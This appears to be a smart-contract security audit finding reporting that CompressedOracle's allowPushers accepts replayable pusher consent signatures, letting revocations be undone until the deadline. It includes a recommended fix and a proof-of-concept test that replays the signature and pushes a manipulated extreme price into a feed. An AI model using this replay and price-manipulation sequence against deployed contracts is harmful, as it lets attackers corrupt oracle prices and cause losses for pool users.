### Title
Pusher delegation consent signature has no nonce — `revokePusher()` can be silently undone unlimited times within the deadline window - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

---

### Summary

`allowPushers` accepts a pusher's EIP-191 consent signature that commits to `(chainid, address(this), deadline, pusher, creator)` but contains **no nonce and no consumed-signature tracking**. The same signature is valid for every call to `allowPushers` until the deadline expires. A creator who holds a pusher's consent signature can replay it an unlimited number of times, re-establishing delegation immediately after each `revokePusher()` call. The pusher has no on-chain mechanism to permanently stop the delegation until the deadline passes.

---

### Finding Description

`allowPushers` in `CompressedOracle.sol` verifies a pusher's EIP-191 signature and writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
// CompressedOracle.sol lines 192-212
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));
    namespaceRemapping[pusher] = msg.sender;   // ← no nonce, no consumed-sig check
    emit PusherAuthorized(pusher, msg.sender);
}
```

The signed payload is `(chainid, oracle, deadline, pusher, creator)`. There is no per-use nonce and no mapping that marks a signature as consumed. `_ensureDeadline` only checks `block.timestamp <= deadline` — it does not prevent the same signature from being submitted again.

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol lines 238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

But because the original signature is still valid (deadline not yet expired), the creator can call `allowPushers` again with the identical `(deadline, [pusher], [sig])` arguments in the very next block, restoring `namespaceRemapping[pusher] = creator`. This cycle can repeat an unlimited number of times — exactly mirroring the Cooler "unlimited rolls" pattern where `loan.rollable = true` and no counter prevents repeated extension.

The code comment on lines 186-191 explicitly acknowledges the deadline is meant to prevent post-revocation re-delegation, but the deadline only bounds the *window*, not the *count* of replays within it:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."

The fix described in the comment (deadline) is incomplete — it prevents re-delegation after the deadline, but not unlimited re-delegation before it.

---

### Impact Explanation

A pusher whose private key is compromised, or who simply wants to stop contributing data to a creator's namespace, calls `revokePusher()`. The creator (or an attacker who obtained the creator key) replays the original consent signature to immediately re-establish the delegation. The pusher's subsequent fallback pushes continue to land in the creator's namespace rather than their own. If the compromised pusher key is used to push manipulated prices, those prices flow into the creator's oracle feeds and from there into any pool that uses the `CompressedOracle` as its price provider, causing bad-price execution on swaps. The pusher has no on-chain remedy until the deadline expires — which may be days or weeks away if a long deadline was chosen at delegation time.

---

### Likelihood Explanation

The attack requires the creator to hold the pusher's original consent signature (which was submitted on-chain in a prior `allowPushers` call and is therefore publicly visible in calldata). Any creator can replay it. The pusher has no way to prevent this without waiting for the deadline to expire. The scenario is reachable by any creator who has previously delegated a pusher and retained the calldata.

---

### Recommendation

Track consumed signatures. Add a `mapping(bytes32 => bool) private _usedConsents` and mark each signature hash as used on first acceptance:

```solidity
bytes32 consentKey = keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender));
require(!_usedConsents[consentKey], "consent already used");
_usedConsents[consentKey] = true;
```

Alternatively, include a per-pusher nonce in the signed payload (`keccak256(abi.encode(..., pusherNonce[pusher]++))`) so each consent is single-use by construction.

### Proof of Concept

```solidity
// 1. Pusher signs consent with deadline = block.timestamp + 30 days
bytes memory sig = sign(PUSHER_KEY, keccak256(abi.encode(
    block.chainid, address(oracle), deadline, pusher, creator
)));

// 2. Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
// namespaceRemapping[pusher] == creator ✓

// 3. Pusher's key is compromised; pusher self-revokes
vm.prank(pusher);
oracle.revokePusher();
// namespaceRemapping[pusher] == address(0) ✓

// 4. Creator replays the SAME signature (deadline not yet expired)
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);   // ← same sig, no revert
// namespaceRemapping[pusher] == creator again ✓

// 5. Attacker (with compromised pusher key) pushes manipulated price into creator namespace
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 manipulatedRaw = _packRaw(9_999_999, 0, 0); // extreme price
vm.prank(pusher /* compromised */);
(bool ok,) = address(oracle).call(_wordAt(0, 0, manipulatedRaw, tsMs));
assertTrue(ok);

// 6. Creator's feed now contains the manipulated price
IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
// data.price == U64x32.decode(manipulatedRaw >> 16)  ← bad price reaches pools
```

    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
